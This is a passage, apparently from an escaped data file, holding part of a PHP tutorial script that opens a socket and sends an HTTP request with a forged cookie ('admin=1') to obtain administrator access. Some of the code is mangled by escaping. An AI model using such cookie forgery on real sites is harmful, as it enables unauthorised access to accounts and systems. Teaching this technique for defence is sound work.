    \ />\\n\";\nelse {\n    // Forming HTTP headers to be passed to the server\n \
    \   $headers = \"GET $path HTTP/1.1\\r\\n\";\n    $headers .= \"Host: $hostname\\\
    r\\n\";\n    // Forging the cookie\n    $headers .= \"Cookie: name=cheops; admin=1\\\
    r\\n\";\n    $headers .= \"Connection: Close\\r\\n\\r\\n\";\n    // Sending an\
    \ HTTP query to the server\n    fwrite($fp, $headers);\n    // Sending the following\
    \ response: while (!feof($fp)) {\n        $line = fgets($fp, 1024);\n    }\nfclose($fp);\n\
    echo $line;\n?>\n```\n\nTo forge the cookie, the script sends the following HTTP\
